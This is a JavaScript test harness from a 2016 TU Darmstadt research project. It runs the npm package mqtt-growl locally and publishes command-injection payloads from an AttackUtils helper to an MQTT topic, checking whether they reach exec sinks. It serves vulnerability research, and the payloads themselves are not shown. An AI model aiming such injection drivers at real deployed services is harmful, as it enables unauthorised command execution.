/**
 * Copyright 2016 Software Lab, TU Darmstadt, Germany
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to
 * deal in the Software without restriction, including without limitation the
 * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
 * sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 *
 * Created by Cristian-Alexandru Staicu on 10.10.16.
 */
module.exports = function (cb) {

    var attackUtils = require("./AttackUtils.js");
    attackUtils.setup();
    var topic = 'test' + (Math.random() * 10000);

    process.argv.push("-p");
    process.argv.push("1884");
    process.argv.push("-t");
    process.argv.push(topic);

    require("mqtt-growl", {});
    var fs = require("fs");

    setTimeout(function () {
        var mqtt = require('mqtt');
        var client = mqtt.createClient(1884, "localhost")

        client.on('connect', function () {
            console.log("connected");
            client.subscribe(topic);
            attackUtils.deliverPayloads(attackUtils.payloadsExec, function (payload) {
                client.publish(topic, 'Hello ' + payload);
            }, function (result, filesWithSinks) {
                var benignInput = "safe benign message";
                client.publish(topic, benignInput);
                setTimeout(function () {
                    attackUtils.printCallStrings();
                    result += " " + attackUtils.observedString(benignInput);
                    process.argv.pop();
                    process.argv.pop();
                    process.argv.pop();
                    process.argv.pop();
                    cb(__filename, result, filesWithSinks);
                }, 1000);
            });

        });
    }, 2000);
};
